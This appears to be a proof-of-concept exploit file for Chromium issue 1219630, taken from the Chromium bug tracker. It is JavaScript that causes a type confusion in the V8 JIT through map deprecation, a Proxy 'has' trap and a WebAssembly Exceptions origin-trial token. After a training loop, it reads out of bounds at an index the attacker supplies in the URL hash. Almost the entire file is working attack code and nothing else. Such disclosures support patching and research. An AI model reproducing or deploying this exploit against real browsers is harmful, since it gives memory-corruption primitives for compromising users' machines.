/*
Source: https://bugs.chromium.org/p/chromium/issues/detail?id=1219630
*/
array = [1.1];
array.stable_map = 1; // LoadElimination ignores fields with non-stable maps

proxy = new Proxy({}, {
	has() {
		object_1.Exception = array;

		object_2.deprecated_map = 1.1;
		object_2.Exception = array;

		return false;
	}
});

object_1 = {__proto__: proxy};
object_1.deprecated_map = 0;

object_2 = {__proto__: proxy};

WebAssembly = object_1;

meta = document.createElement('meta');
meta.httpEquiv = 'Origin-Trial';
meta.content = 'AkraUQ8UvLgBl/MKvqU9ZuwZ2csKJU75hMutXva8msph9EKaxUkf1fmA4V3y8' +
							 'SLmwlYwFzKQHL2w+lwlIzfcJgsAAAB2eyJvcmlnaW4iOiJodHRwczovL2FuYW' +
							 'xvZy1mYXN0bmVzcy0yMzAyMTkudWMuci5hcHBzcG90LmNvbTo0NDMiLCJmZWF' +
							 '0dXJlIjoiV2ViQXNzZW1ibHlFeGNlcHRpb25zIiwiZXhwaXJ5IjoxNjM3MTA3' +
							 'MTk5fQ==';
document.head.appendChild(meta);

delete object_1.Exception; // transition back to object_2's map

jit = (object, index) => {
	return object.Exception[index];
}
for (var i = 0; i < 100000; ++i)
	jit(object_2, 0);

alert(jit(object_1, Number(location.hash.substring(1))));